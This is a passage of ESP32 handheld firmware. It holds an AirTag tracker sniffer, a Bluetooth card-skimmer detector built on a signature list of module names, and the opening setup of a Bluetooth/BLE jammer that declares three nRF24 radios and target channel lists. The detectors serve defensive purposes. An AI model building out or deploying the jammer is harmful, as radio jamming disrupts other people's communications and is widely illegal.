            (size_t)(s_hitCount - weakest - 1) * sizeof(Hit));
    s_hitCount--;
    s_listDirty = true;
  }

  Hit& h = s_hits[s_hitCount++];
  memcpy(h.mac, mac, 6);
  h.rssi = rssi;
  h.kind = kind;
  h.status = status;
  h.hits = 1;
  h.lastSeen = millis();
  h.dirty = true;
  s_listDirty = true;
}

static bool parseAppleAdv(const uint8_t* data, size_t len,
                          uint8_t* kindOut, uint8_t* statusOut) {
  if (!data || len < 4) {
    return false;
  }
  // NimBLE manufacturer data: company ID LE + payload.
  if (data[0] != 0x4C || data[1] != 0x00) {
    return false;
  }
  const uint8_t appleType = data[2];
  if (appleType == 0x12) {
    *kindOut = HIT_FIND_MY;
    *statusOut = (len > 4) ? data[4] : 0;
    return true;
  }
  // Continuity Proximity Pairing â€” New AirTag prefix 0x05.
  if (appleType == 0x07 && len >= 5 && data[4] == 0x05) {
    *kindOut = HIT_NEW_AT;
    *statusOut = data[4];
    return true;
  }
  return false;
}

class AdvCallbacks : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice* device) override {
    if (!s_scanning || !device || !device->haveManufacturerData()) {
      return;
    }
    const std::string md = device->getManufacturerData();
    uint8_t kind = 0;
    uint8_t status = 0;
    if (!parseAppleAdv(reinterpret_cast<const uint8_t*>(md.data()), md.size(),
                       &kind, &status)) {
      return;
    }

    const std::string addrStr = device->getAddress().toString();
    unsigned int b0 = 0, b1 = 0, b2 = 0, b3 = 0, b4 = 0, b5 = 0;
    if (sscanf(addrStr.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
               &b0, &b1, &b2, &b3, &b4, &b5) != 6) {
      return;
    }
    const uint8_t mac[6] = {
      (uint8_t)b0, (uint8_t)b1, (uint8_t)b2,
      (uint8_t)b3, (uint8_t)b4, (uint8_t)b5
    };

    const int8_t rssi = (int8_t)device->getRSSI();

    portENTER_CRITICAL(&s_mux);
    upsertHit(mac, rssi, kind, status);
    s_hasUpdates = true;
    portEXIT_CRITICAL(&s_mux);
  }
};

static AdvCallbacks s_callbacks;

static void stopScan() {
  if (s_scan) {
    s_scan->stop();
    s_scan->setAdvertisedDeviceCallbacks(nullptr);
  }
  s_scanning = false;
}

static void startScan() {
  if (!s_scan) {
    ensureBleStackReady();
    s_scan = BLEDevice::getScan();
  }
  s_scan->stop();
  s_scan->setAdvertisedDeviceCallbacks(&s_callbacks, true);
  s_scan->setActiveScan(true);
  s_scan->setInterval(80);
  s_scan->setWindow(60);
  s_scan->setDuplicateFilter(false);
  s_scanning = true;
  // Non-blocking continuous scan. start(0, false) is the BLOCKING overload
  // and hangs forever with duration 0.
  s_scan->start(0, nullptr, false);
}

static void clearHits() {
  portENTER_CRITICAL(&s_mux);
  s_hitCount = 0;
  s_selected = 0;
  s_page = 0;
  s_listDirty = true;
  s_hasUpdates = true;
  portEXIT_CRITICAL(&s_mux);
}

static void clampSelection() {
  const int per = rowsPerPage();
  if (s_hitCount <= 0) {
    s_selected = 0;
    s_page = 0;
    return;
  }
  if (s_selected >= s_hitCount) {
    s_selected = s_hitCount - 1;
  }
  if (s_selected < 0) {
    s_selected = 0;
  }
  s_page = s_selected / per;
}

static void handleButtons() {
  const unsigned long now = millis();
  if (now - s_lastBtnMs < BTN_DEBOUNCE_MS) {
    (void)isButtonPressedEdge(BTN_SELECT);
    (void)isButtonPressedEdge(BTN_RIGHT);
    (void)isButtonPressedEdge(BTN_UP);
    (void)isButtonPressedEdge(BTN_DOWN);
    return;
  }

  // Remapped layout: SELECT is now Start/Stop (the most important action,
  // was LEFT). LEFT is the universal Exit, handled as a level check in
  // airTagSnifferLoop().
  if (isButtonPressedEdge(BTN_SELECT)) {
    if (s_scanning) {
      stopScan();
    } else {
      startScan();
    }
    updateHeader(true);
    updateNavLabels();
    s_lastBtnMs = now;
    return;
  }

  // Remapped layout: Prev/Next always sit on UP/DOWN -- UP stays Prev, Next
  // moves to DOWN (was RIGHT), Clear moves to RIGHT (was DOWN).
  if (isButtonPressedEdge(BTN_RIGHT)) {
    clearHits();
    updateHeader(true);
    redrawList();
    s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_UP)) {
    if (s_hitCount <= 0) {
      return;
    }
    const int prev = s_selected;
    s_selected = (s_selected <= 0) ? (s_hitCount - 1) : (s_selected - 1);
    clampSelection();
    if (s_selected / rowsPerPage() != prev / rowsPerPage()) {
      s_listDirty = true;
      redrawList();
    } else {
      const int per = rowsPerPage();
      paintRow(prev % per, false);
      paintRow(s_selected % per, true);
    }
    s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_DOWN)) {
    if (s_hitCount <= 0) {
      return;
    }
    const int prev = s_selected;
    s_selected = (s_selected + 1) % s_hitCount;
    clampSelection();
    if (s_selected / rowsPerPage() != prev / rowsPerPage()) {
      s_listDirty = true;
      redrawList();
    } else {
      const int per = rowsPerPage();
      paintRow(prev % per, false);
      paintRow(s_selected % per, true);
    }
    s_lastBtnMs = now;
    return;
  }
}

static void runUI() {
  static const unsigned char* icons[ICON_NUM] = {bitmap_icon_go_back};
  if (!s_uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i]) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, ORANGE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    s_uiDrawn = true;
  }

  static unsigned long lastTouchCheck = 0;
  if (millis() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            feature_exit_requested = true;
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

static void teardown() {
  stopScan();
  s_scan = nullptr;
}

void airTagSnifferSetup() {
  if (!bleRequireStackOrExit()) return;
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  bleClearBody(TFT_BLACK);
  setupTouchscreen();

  s_uiDrawn = false;
  s_chromeDrawn = false;
  s_scanning = false;
  s_listDirty = true;
  s_hitCount = 0;
  s_selected = 0;
  s_page = 0;
  s_hasUpdates = false;
  s_lastBtnMs = 0;
  s_lastUiMs = 0;
  s_cacheFound[0] = '\0';
  s_cacheState[0] = '\0';
  s_scan = nullptr;

  // Stop any other BLE scan that may be holding the radio.
  {
    BLEScan* existing = BLEDevice::getScan();
    if (existing) {
      existing->stop();
    }
  }

  float v = readBatteryVoltage();
  drawStatusBar(v, true);
  redrawTouchButtonBar();
  runUI();
  updateNavLabels();
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  updateHeader(true);
  redrawList();

  // Auto-start so the feature is immediately useful.
  startScan();
  updateHeader(true);
  updateNavLabels();
}

void airTagSnifferLoop() {
  if (feature_exit_requested) {
    teardown();
    return;
  }
  // Remapped layout: LEFT exits now (was SELECT).
  if (feature_active && isButtonPressed(BTN_LEFT)) {
    teardown();
    feature_exit_requested = true;
    return;
  }

  handleButtons();
  runUI();
  updateStatusBar();
  maintainTouchNavBar();

  const unsigned long now = millis();
  if (s_hasUpdates || (now - s_lastUiMs >= UI_MS)) {
    s_lastUiMs = now;
    bool updates = false;
    portENTER_CRITICAL(&s_mux);
    updates = s_hasUpdates;
    s_hasUpdates = false;
    portEXIT_CRITICAL(&s_mux);

    if (updates || s_listDirty) {
      clampSelection();
      updateHeader(false);
      if (s_listDirty) {
        redrawList();
      } else {
        refreshDirtyRows();
      }
    }
  }

  // Keep continuous scan alive if NimBLE stopped it.
  if (s_scanning && s_scan && !s_scan->isScanning()) {
    s_scan->start(0, nullptr, false);
  }

  if (feature_exit_requested) {
    teardown();
  }
}

void exit() {
  teardown();
}

}  // namespace AirTagSniffer


namespace BleSkimmer {

#define SCREEN_WIDTH 240
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 1

static constexpr int HDR_Y = 40;
static constexpr int LIST_Y = 58;
static constexpr int ROW_H = 32;
static constexpr int MAX_HITS = 32;
static constexpr int NAME_LEN = 18;
static constexpr int LABEL_LEN = 12;
static constexpr unsigned long BTN_DEBOUNCE_MS = 220;
static constexpr unsigned long UI_MS = 250;

struct Hit {
  uint8_t mac[6];
  int8_t rssi;
  uint8_t threat;
  uint16_t hits;
  char name[NAME_LEN];
  char label[LABEL_LEN];
  bool dirty;
};

struct Signature {
  const char* needle;  // normalized (A-Z0-9 only)
  const char* label;
  uint8_t threat;
};

// Default names used on hobbyist BT/BLE serial modules commonly found in
// Bluetooth-enabled card skimmers (SparkFun/Marauder research). A hit means
// a suspicious module is nearby — not proof of a skimmer.
static const Signature s_sigs[] = {
  {"FREE2MOVE", "FREE2MOVE", 5},
  {"BTHC05", "BT-HC05", 5},
  {"BTHC06", "BT-HC06", 5},
  {"MLTBT05", "MLT-BT05", 4},
  {"BT04A", "BT04-A", 4},
  {"BTSPP", "BT-SPP", 4},
  {"CC41A", "CC41-A", 4},
  {"SPPCA", "SPP-CA", 4},
  {"LINVOR", "LINVOR", 4},
  {"HC03", "HC-03", 5},
  {"HC04", "HC-04", 5},
  {"HC05", "HC-05", 5},
  {"HC06", "HC-06", 5},
  {"HC08", "HC-08", 5},
  {"BT04", "BT-04", 4},
  {"BT05", "BT-05", 4},
  {"BT06", "BT-06", 4},
  {"BT08", "BT-08", 4},
  {"CC41", "CC41", 4},
  {"HM10", "HM-10", 3},
  {"HM11", "HM-11", 3},
  {"HM19", "HM-19", 3},
  {"AT09", "AT-09", 3},
  {"JDY08", "JDY-08", 4},
  {"JDY10", "JDY-10", 4},
  {"JDY16", "JDY-16", 4},
  {"JDY23", "JDY-23", 4},
  {"JDY31", "JDY-31", 4},
};

static int iconX[ICON_NUM] = {10};
static int iconY = STATUS_BAR_Y_OFFSET;
static bool s_uiDrawn = false;
static bool s_chromeDrawn = false;
static bool s_scanning = false;
static bool s_listDirty = true;
static unsigned long s_lastBtnMs = 0;
static unsigned long s_lastUiMs = 0;

static Hit s_hits[MAX_HITS];
static int s_hitCount = 0;
static int s_drawnCount = 0;
static int s_selected = 0;
static int s_page = 0;

static BLEScan* s_scan = nullptr;
static portMUX_TYPE s_mux = portMUX_INITIALIZER_UNLOCKED;
static volatile bool s_hasUpdates = false;

static char s_cacheFound[24] = {0};
static char s_cacheState[12] = {0};

static int listBottomY() {
  return bleContentBottom() - 2;
}

static int rowsPerPage() {
  const int h = listBottomY() - LIST_Y;
  if (h < ROW_H) {
    return 1;
  }
  return h / ROW_H;
}

static void updateNavLabels() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  // Remapped layout: LEFT=Exit (was Start/Stop), SELECT=Start/Stop (the most
  // important action, was Exit). Next moves to DOWN (was RIGHT; Prev/Next
  // always sit on UP/DOWN), Prev stays UP, Clear moves to RIGHT (was DOWN).
  setTouchNavLabels("Exit",
                    "Next",
                    s_scanning ? "Stop" : "Start",
                    "Prev",
                    "Clear");
  redrawTouchButtonBar();
}

static void paintField(int x, int y, int w, char* cache, size_t cacheSz,
                       const char* text, uint16_t color) {
  if (!text) {
    text = "";
  }
  if (cache && strcmp(cache, text) == 0) {
    return;
  }
  tft.setTextFont(1);
  tft.setTextSize(1);
  int clearW = w;
  if (cache && cache[0]) {
    const int oldW = tft.textWidth(cache) + 2;
    const int newW = text[0] ? (tft.textWidth(text) + 2) : 0;
    clearW = oldW > newW ? oldW : newW;
    if (clearW > w) {
      clearW = w;
    }
  }
  tft.fillRect(x, y, clearW, 10, TFT_BLACK);
  tft.setTextColor(color, TFT_BLACK);
  tft.setCursor(x, y);
  tft.print(text);
  if (cache && cacheSz > 0) {
    strncpy(cache, text, cacheSz - 1);
    cache[cacheSz - 1] = '\0';
  }
}

static void drawChrome() {
  if (s_chromeDrawn) {
    return;
  }
  s_chromeDrawn = true;
  tft.drawFastHLine(10, HDR_Y + 12, SCREEN_WIDTH - 20, UI_LINE);
}

static void updateHeader(bool force) {
  drawChrome();
  if (force) {
    s_cacheFound[0] = '\0';
    s_cacheState[0] = '\0';
  }

  tft.setTextFont(1);
  tft.setTextSize(1);

  char found[24];
  if (s_hitCount <= 0) {
    snprintf(found, sizeof(found), "No suspects yet");
  } else if (s_hitCount == 1) {
    snprintf(found, sizeof(found), "1 suspect nearby");
  } else {
    snprintf(found, sizeof(found), "%d suspects nearby", s_hitCount);
  }
  paintField(10, HDR_Y, 150, s_cacheFound, sizeof(s_cacheFound), found,
             s_hitCount > 0 ? ORANGE : UI_DIM_TEXT);
  paintField(170, HDR_Y, 65, s_cacheState, sizeof(s_cacheState),
             s_scanning ? "Scanning" : "Stopped",
             s_scanning ? ORANGE : UI_DIM_TEXT);
}

static void paintRow(int listIndex, bool selected) {
  const int per = rowsPerPage();
  if (listIndex < 0 || listIndex >= per) {
    return;
  }
  const int absIndex = s_page * per + listIndex;
  const int y = LIST_Y + listIndex * ROW_H;
  if (y + ROW_H > listBottomY()) {
    return;
  }

  tft.fillRect(0, y, SCREEN_WIDTH, ROW_H, TFT_BLACK);
  if (absIndex >= s_hitCount) {
    return;
  }

  const Hit& h = s_hits[absIndex];
  const uint16_t titleColor = selected ? ORANGE : WHITE;
  const uint16_t detailColor = selected ? ORANGE : UI_DIM_TEXT;

  // Prefer advertised name; fall back to matched module type.
  const char* primary = h.name[0] ? h.name : (h.label[0] ? h.label : "Suspect");

  // Keep both lines on font 1 so name/MAC never overlap.
  tft.setTextFont(1);
  tft.setTextSize(1);

  tft.setTextColor(titleColor, TFT_BLACK);
  tft.setCursor(10, y + 4);
  // Leave room for RSSI on the right so long names don't collide.
  {
    char shown[17];
    strncpy(shown, primary, sizeof(shown) - 1);
    shown[sizeof(shown) - 1] = '\0';
    tft.print(shown);
  }

  char rssi[12];
  snprintf(rssi, sizeof(rssi), "%d dBm", (int)h.rssi);
  tft.setTextColor(detailColor, TFT_BLACK);
  const int rssiW = tft.textWidth(rssi);
  tft.setCursor(SCREEN_WIDTH - 10 - rssiW, y + 4);
  tft.print(rssi);

  char mac[20];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           h.mac[0], h.mac[1], h.mac[2], h.mac[3], h.mac[4], h.mac[5]);
  tft.setTextColor(detailColor, TFT_BLACK);
  tft.setCursor(10, y + 18);
  tft.print(mac);

  if (selected) {
    tft.fillRect(2, y + 2, 3, ROW_H - 4, ORANGE);
  }
}

// Update only the dBm field — avoids wiping the whole row (no flicker).
static void paintRssiOnly(int listIndex, bool selected) {
  const int per = rowsPerPage();
  if (listIndex < 0 || listIndex >= per) {
    return;
  }
  const int absIndex = s_page * per + listIndex;
  if (absIndex < 0 || absIndex >= s_hitCount) {
    return;
  }
  const int y = LIST_Y + listIndex * ROW_H;
  if (y + ROW_H > listBottomY()) {
    return;
  }

  const Hit& h = s_hits[absIndex];
  const uint16_t detailColor = selected ? ORANGE : UI_DIM_TEXT;
  char rssi[12];
  snprintf(rssi, sizeof(rssi), "%d dBm", (int)h.rssi);

  tft.setTextFont(1);
  tft.setTextSize(1);
  // Stay on the right edge so we never erase name/MAC.
  tft.fillRect(SCREEN_WIDTH - 72, y + 2, 62, 12, TFT_BLACK);
  tft.setTextColor(detailColor, TFT_BLACK);
  const int rssiW = tft.textWidth(rssi);
  tft.setCursor(SCREEN_WIDTH - 10 - rssiW, y + 4);
  tft.print(rssi);
}

static void redrawList() {
  const int per = rowsPerPage();
  const int start = s_page * per;

  if (s_hitCount <= 0) {
    const int h = listBottomY() - LIST_Y;
    if (h > 0) {
      tft.fillRect(0, LIST_Y, SCREEN_WIDTH, h, TFT_BLACK);
    }
    tft.setTextFont(1);
    tft.setTextSize(1);
    tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
    tft.setCursor(10, LIST_Y + 6);
    tft.print(s_scanning ? "Listening for known skimmer" : "Press Start to begin");
    tft.setCursor(10, LIST_Y + 18);
    tft.print(s_scanning ? "Bluetooth module names..." : "scanning for suspects.");
    tft.setCursor(10, LIST_Y + 36);
    tft.print("Looks for: HC-05, HM-10,");
    tft.setCursor(10, LIST_Y + 48);
    tft.print("JDY, BT-05, and similar.");
    tft.setCursor(10, LIST_Y + 66);
    tft.print("A match is a warning only,");
    tft.setCursor(10, LIST_Y + 78);
    tft.print("not proof of a skimmer.");
    s_listDirty = false;
    return;
  }

  for (int i = 0; i < per; i++) {
    paintRow(i, (start + i) == s_selected);
  }
  s_listDirty = false;
  for (int i = 0; i < s_hitCount; i++) {
    s_hits[i].dirty = false;
  }
}

static void refreshDirtyRows() {
  const int per = rowsPerPage();
  const int start = s_page * per;
  bool any = s_listDirty;
  for (int i = start; i < start + per && i < s_hitCount; i++) {
    if (s_hits[i].dirty) {
      any = true;
      break;
    }
  }
  if (!any) {
    return;
  }
  for (int i = 0; i < per; i++) {
    const int absIndex = start + i;
    if (absIndex < s_hitCount && (s_listDirty || s_hits[absIndex].dirty)) {
      paintRow(i, absIndex == s_selected);
      s_hits[absIndex].dirty = false;
    } else if (s_listDirty && absIndex >= s_hitCount) {
      paintRow(i, false);
    }
  }
  s_listDirty = false;
}

static void normalizeName(const char* in, char* out, size_t outSz) {
  size_t j = 0;
  for (size_t i = 0; in && in[i] && j + 1 < outSz; i++) {
    char c = in[i];
    if (c >= 'a' && c <= 'z') {
      c = (char)(c - 'a' + 'A');
    }
    if ((c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9')) {
      out[j++] = c;
    }
  }
  out[j] = '\0';
}

static bool matchSignature(const char* rawName, char* labelOut, size_t labelSz,
                           uint8_t* threatOut) {
  if (!rawName || !rawName[0]) {
    return false;
  }
  char norm[48];
  normalizeName(rawName, norm, sizeof(norm));
  if (!norm[0]) {
    return false;
  }

  // Any JDY-xx family member.
  if (strncmp(norm, "JDY", 3) == 0 && strlen(norm) >= 3) {
    strncpy(labelOut, "JDY-*", labelSz - 1);
    labelOut[labelSz - 1] = '\0';
    *threatOut = 4;
    return true;
  }

  for (size_t i = 0; i < sizeof(s_sigs) / sizeof(s_sigs[0]); i++) {
    if (strstr(norm, s_sigs[i].needle) != nullptr) {
      strncpy(labelOut, s_sigs[i].label, labelSz - 1);
      labelOut[labelSz - 1] = '\0';
      *threatOut = s_sigs[i].threat;
      return true;
    }
  }
  return false;
}

static int findHitIndex(const uint8_t mac[6]) {
  for (int i = 0; i < s_hitCount; i++) {
    if (memcmp(s_hits[i].mac, mac, 6) == 0) {
      return i;
    }
  }
  return -1;
}

static bool upsertHit(const uint8_t mac[6], int8_t rssi, uint8_t threat,
                      const char* label, const char* name) {
  const int idx = findHitIndex(mac);
  if (idx >= 0) {
    Hit& h = s_hits[idx];
    bool soft = false;
    h.rssi = rssi;
    h.hits++;
    if (threat > h.threat) {
      h.threat = threat;
    }
    if (label && label[0] && strcmp(h.label, label) != 0) {
      strncpy(h.label, label, LABEL_LEN - 1);
      h.label[LABEL_LEN - 1] = '\0';
      h.dirty = true;
      soft = true;
    }
    if (name && name[0] && strcmp(h.name, name) != 0) {
      strncpy(h.name, name, NAME_LEN - 1);
      h.name[NAME_LEN - 1] = '\0';
      h.dirty = true;
      soft = true;
    }
    return soft;
  }

  if (s_hitCount >= MAX_HITS) {
    int weakest = 0;
    for (int i = 1; i < s_hitCount; i++) {
      if (s_hits[i].rssi < s_hits[weakest].rssi) {
        weakest = i;
      }
    }
    if (rssi < s_hits[weakest].rssi) {
      return false;
    }
    memmove(&s_hits[weakest], &s_hits[weakest + 1],
            (size_t)(s_hitCount - weakest - 1) * sizeof(Hit));
    s_hitCount--;
  }

  Hit& h = s_hits[s_hitCount++];
  memcpy(h.mac, mac, 6);
  h.rssi = rssi;
  h.threat = threat;
  h.hits = 1;
  h.label[0] = '\0';
  h.name[0] = '\0';
  if (label) {
    strncpy(h.label, label, LABEL_LEN - 1);
    h.label[LABEL_LEN - 1] = '\0';
  }
  if (name) {
    strncpy(h.name, name, NAME_LEN - 1);
    h.name[NAME_LEN - 1] = '\0';
  }
  h.dirty = true;
  s_listDirty = true;
  return true;
}

static void extractName(BLEAdvertisedDevice* device, char* out, size_t outSz) {
  out[0] = '\0';
  if (!device || outSz < 2) {
    return;
  }
  std::string n = device->getName();
  if (n.empty()) {
    n = device->getPayloadByType(0x09);
  }
  if (n.empty()) {
    n = device->getPayloadByType(0x08);
  }
  if (n.empty()) {
    return;
  }
  strncpy(out, n.c_str(), outSz - 1);
  out[outSz - 1] = '\0';
  for (char* p = out; *p; ++p) {
    const unsigned char c = (unsigned char)*p;
    if (c < 32 || c > 126) {
      *p = '?';
    }
  }
  // Trim trailing spaces/junk so name compares/refreshes cleanly.
  for (int i = (int)strlen(out) - 1; i >= 0; --i) {
    if (out[i] == ' ' || out[i] == '?') {
      out[i] = '\0';
    } else {
      break;
    }
  }
}

class AdvCallbacks : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice* device) override {
    if (!s_scanning || !device) {
      return;
    }

    char name[32];
    extractName(device, name, sizeof(name));

    char label[LABEL_LEN];
    uint8_t threat = 0;
    if (!matchSignature(name, label, sizeof(label), &threat)) {
      return;
    }

    const std::string addrStr = device->getAddress().toString();
    unsigned int b0 = 0, b1 = 0, b2 = 0, b3 = 0, b4 = 0, b5 = 0;
    if (sscanf(addrStr.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
               &b0, &b1, &b2, &b3, &b4, &b5) != 6) {
      return;
    }
    const uint8_t mac[6] = {
      (uint8_t)b0, (uint8_t)b1, (uint8_t)b2,
      (uint8_t)b3, (uint8_t)b4, (uint8_t)b5
    };

    portENTER_CRITICAL(&s_mux);
    if (upsertHit(mac, (int8_t)device->getRSSI(), threat, label, name)) {
      s_hasUpdates = true;
    }
    portEXIT_CRITICAL(&s_mux);
  }
};

static AdvCallbacks s_callbacks;

static void stopScan() {
  if (s_scan) {
    s_scan->stop();
    s_scan->setAdvertisedDeviceCallbacks(nullptr);
  }
  s_scanning = false;
}

static void startScan() {
  if (!s_scan) {
    ensureBleStackReady();
    s_scan = BLEDevice::getScan();
  }
  s_scan->stop();
  s_scan->setAdvertisedDeviceCallbacks(&s_callbacks, true);
  s_scan->setActiveScan(true);
  s_scan->setInterval(100);
  s_scan->setWindow(50);
  s_scan->setDuplicateFilter(false);
  s_scanning = true;
  s_scan->start(0, nullptr, false);
}

static void clearHits() {
  portENTER_CRITICAL(&s_mux);
  s_hitCount = 0;
  s_drawnCount = 0;
  s_selected = 0;
  s_page = 0;
  s_listDirty = true;
  s_hasUpdates = true;
  portEXIT_CRITICAL(&s_mux);
}

static void clampSelection() {
  const int per = rowsPerPage();
  if (s_hitCount <= 0) {
    s_selected = 0;
    s_page = 0;
    return;
  }
  if (s_selected >= s_hitCount) {
    s_selected = s_hitCount - 1;
  }
  if (s_selected < 0) {
    s_selected = 0;
  }
  s_page = s_selected / per;
}

static void handleButtons() {
  const unsigned long now = millis();
  if (now - s_lastBtnMs < BTN_DEBOUNCE_MS) {
    (void)isButtonPressedEdge(BTN_SELECT);
    (void)isButtonPressedEdge(BTN_RIGHT);
    (void)isButtonPressedEdge(BTN_UP);
    (void)isButtonPressedEdge(BTN_DOWN);
    return;
  }

  // Remapped layout: SELECT is now Start/Stop (the most important action,
  // was LEFT). LEFT is the universal Exit, handled as a level check in
  // bleSkimmerLoop().
  if (isButtonPressedEdge(BTN_SELECT)) {
    if (s_scanning) {
      stopScan();
    } else {
      startScan();
    }
    updateHeader(true);
    updateNavLabels();
    s_listDirty = true;
    s_drawnCount = 0;
    redrawList();
    s_drawnCount = s_hitCount;
    s_lastBtnMs = now;
    return;
  }

  // Remapped layout: Prev/Next always sit on UP/DOWN -- UP stays Prev, Next
  // moves to DOWN (was RIGHT), Clear moves to RIGHT (was DOWN).
  if (isButtonPressedEdge(BTN_RIGHT)) {
    clearHits();
    updateHeader(true);
    redrawList();
    s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_UP)) {
    if (s_hitCount <= 0) {
      return;
    }
    const int prev = s_selected;
    s_selected = (s_selected <= 0) ? (s_hitCount - 1) : (s_selected - 1);
    clampSelection();
    if (s_selected / rowsPerPage() != prev / rowsPerPage()) {
      s_listDirty = true;
      s_drawnCount = 0;
      redrawList();
      s_drawnCount = s_hitCount;
    } else {
      const int per = rowsPerPage();
      paintRow(prev % per, false);
      paintRow(s_selected % per, true);
    }
    s_lastBtnMs = now;
    return;
  }

  if (isButtonPressedEdge(BTN_DOWN)) {
    if (s_hitCount <= 0) {
      return;
    }
    const int prev = s_selected;
    s_selected = (s_selected + 1) % s_hitCount;
    clampSelection();
    if (s_selected / rowsPerPage() != prev / rowsPerPage()) {
      s_listDirty = true;
      s_drawnCount = 0;
      redrawList();
      s_drawnCount = s_hitCount;
    } else {
      const int per = rowsPerPage();
      paintRow(prev % per, false);
      paintRow(s_selected % per, true);
    }
    s_lastBtnMs = now;
    return;
  }
}

static void runUI() {
  static const unsigned char* icons[ICON_NUM] = {bitmap_icon_go_back};
  if (!s_uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i]) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, ORANGE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    s_uiDrawn = true;
  }

  static unsigned long lastTouchCheck = 0;
  if (millis() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            feature_exit_requested = true;
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

static void teardown() {
  stopScan();
  s_scan = nullptr;
}

void bleSkimmerSetup() {
  if (!bleRequireStackOrExit()) return;
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  bleClearBody(TFT_BLACK);
  setupTouchscreen();

  s_uiDrawn = false;
  s_chromeDrawn = false;
  s_scanning = false;
  s_listDirty = true;
  s_hitCount = 0;
  s_drawnCount = 0;
  s_selected = 0;
  s_page = 0;
  s_hasUpdates = false;
  s_lastBtnMs = 0;
  s_lastUiMs = 0;
  s_cacheFound[0] = '\0';
  s_cacheState[0] = '\0';
  s_scan = nullptr;

  {
    BLEScan* existing = BLEDevice::getScan();
    if (existing) {
      existing->stop();
    }
  }

  float v = readBatteryVoltage();
  drawStatusBar(v, true);
  redrawTouchButtonBar();
  runUI();
  updateNavLabels();
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  updateHeader(true);
  redrawList();

  startScan();
  updateHeader(true);
  updateNavLabels();
}

void bleSkimmerLoop() {
  if (feature_exit_requested) {
    teardown();
    return;
  }
  // Remapped layout: LEFT exits now (was SELECT).
  if (feature_active && isButtonPressed(BTN_LEFT)) {
    teardown();
    feature_exit_requested = true;
    return;
  }

  handleButtons();
  runUI();

  static unsigned long s_lastStatusMs = 0;
  static unsigned long s_lastRssiMs = 0;
  const unsigned long now = millis();
  if (now - s_lastStatusMs >= 1000) {
    s_lastStatusMs = now;
    updateStatusBar();
  }
  maintainTouchNavBar();

  // New suspects or name/MAC text changes.
  if (s_hasUpdates || s_listDirty) {
    bool need = false;
    bool full = false;
    int hitCount = 0;
    portENTER_CRITICAL(&s_mux);
    need = s_hasUpdates || s_listDirty;
    full = s_listDirty;
    s_hasUpdates = false;
    s_listDirty = false;
    hitCount = s_hitCount;
    portEXIT_CRITICAL(&s_mux);

    if (need) {
      clampSelection();
      if (full || hitCount != s_drawnCount) {
        updateHeader(true);
        redrawList();
        s_drawnCount = hitCount;
        s_lastRssiMs = now;
      } else {
        // Name/label changed on an existing row — repaint that row only.
        refreshDirtyRows();
      }
    }
  }

  // Live RSSI about once per second — only the dBm text, not the whole row.
  if (s_hitCount > 0 && (now - s_lastRssiMs >= 1000)) {
    s_lastRssiMs = now;
    const int per = rowsPerPage();
    const int start = s_page * per;
    for (int i = 0; i < per; i++) {
      const int absIndex = start + i;
      if (absIndex >= s_hitCount) {
        break;
      }
      paintRssiOnly(i, absIndex == s_selected);
    }
  }

  if (s_scanning && s_scan && !s_scan->isScanning()) {
    s_scan->start(0, nullptr, false);
  }

  if (feature_exit_requested) {
    teardown();
  }
}

void exit() {
  teardown();
}

}  // namespace BleSkimmer


namespace BleJammer {

RF24 radio1(CE_PIN_1, CSN_PIN_1, 16000000);
RF24 radio2(CE_PIN_2, CSN_PIN_2, 16000000);
RF24 radio3(CE_PIN_3, CSN_PIN_3, 16000000);

enum OperationMode { BLE_MODULE, Bluetooth_MODULE };
OperationMode currentMode = BLE_MODULE;

bool jammerActive = false;

int bluetooth_channels[] = {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};
int ble_channels[] = {2, 26, 80};

const byte BLE_channels[] = {2, 26, 80};
byte channelGroup1[] = {2, 5, 8, 11};
byte channelGroup2[] = {26, 29, 32, 35};
byte channelGroup3[] = {80, 83, 86, 89};

#define SCREEN_HEIGHT 320
#define LINE_HEIGHT 12
